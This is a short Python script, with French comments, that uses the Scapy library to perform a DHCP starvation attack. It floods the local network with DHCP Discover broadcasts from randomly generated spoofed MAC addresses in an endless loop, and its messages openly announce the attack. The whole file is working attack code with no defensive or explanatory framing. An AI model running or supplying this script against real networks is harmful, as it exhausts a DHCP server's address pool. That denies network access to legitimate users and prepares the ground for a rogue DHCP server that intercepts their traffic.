from scapy.all import *
import random

# Interface réseau à utiliser
INTERFACE = "eth0"  # Changez par l'interface réseau appropriée

# Génère une adresse MAC aléatoire
def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )

# Fonction pour envoyer des requêtes DHCP Discover
def send_dhcp_discover():
    mac_address = random_mac()
    dhcp_discover = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
                    IP(src="0.0.0.0", dst="255.255.255.255") / \
                    UDP(sport=68, dport=67) / \
                    BOOTP(chaddr=mac2str(mac_address)) / \
                    DHCP(options=[("message-type", "discover"), "end"])
    
    sendp(dhcp_discover, iface=INTERFACE, verbose=0)

# Boucle infinie pour envoyer des requêtes en continu
def main():
    print("[*] Démarrage de l'attaque DHCP Starvation...")
    try:
        while True:
            send_dhcp_discover()
    except KeyboardInterrupt:
        print("\n[!] Attaque interrompue. Script arrêté.")

if __name__ == "__main__":
    main()
